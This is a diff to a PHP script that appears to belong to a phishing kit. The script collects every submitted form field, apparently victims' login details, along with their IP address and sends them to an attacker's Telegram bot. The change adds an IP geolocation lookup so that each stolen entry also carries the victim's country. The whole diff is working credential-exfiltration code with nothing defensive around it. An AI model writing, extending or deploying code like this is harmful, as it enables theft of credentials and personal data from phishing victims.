@@ -55,6 +55,9 @@ header("Location: password.php");
     $ip = getenv("REMOTE_ADDR");
     $ThanksURL = "thanks.html";
 
+$geo = @json_decode(file_get_contents("http://ip-api.com/json/" . $ip));
+$country = $geo->country ?? "Unknown";
+
     $zoolanderzoolanderzoolanderzoolanderzoolander = "";
 
     foreach ($_POST as $Field => $Value) {
@@ -67,7 +70,9 @@ header("Location: password.php");
         $website = "https://api.telegram.org/bot" . $telegram_BOT_zoolander;
         $params = [
             'chat_id' => $telegram_Chat_ID,
-            'text' => $zoolanderzoolanderzoolanderzoolanderzoolander . "<br>" . $ip,
+            'text' => $zoolanderzoolanderzoolanderzoolanderzoolander . "<br>" 
+            . "\nIP: " . $ip
+              . "\nCountry: " . $country,
         ];
         $ch = curl_init($website . '/sendMessage');
         curl_setopt($ch, CURLOPT_HEADER, false);
